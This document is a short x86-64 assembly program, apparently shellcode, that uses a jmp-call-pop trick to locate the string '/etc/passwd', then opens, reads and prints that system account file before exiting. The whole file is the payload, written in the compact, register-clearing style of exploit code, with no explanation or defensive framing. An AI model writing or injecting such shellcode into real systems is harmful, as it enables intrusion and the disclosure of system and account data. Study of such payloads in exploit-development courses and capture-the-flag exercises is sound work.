bits 64
section .text
global _start

_start:

	jmp filename

	; open("/etc/passwd", O_RDONLY)
	open:
	
	xor rax, rax
	xor rsi, rsi
	mov al, 2
	pop rdi

	syscall

	mov rdi, rax

	; read(filefd, buf, 0x1337)

	xor rax, rax
	xor rdx, rdx
	mov dx, 0x1337
	sub sp, dx
	mov rsi, rsp

	syscall

	; write(stdout, buf, len(buf))

	mov rdx, rax
	xor rax, rax
	mov al, 1
	mov rdi, rax

	syscall

	; exit(0)

	xor rax, rax
	mov al, 60
	xor rdi, rdi

	syscall


	filename:
		call open
		db "/etc/passwd"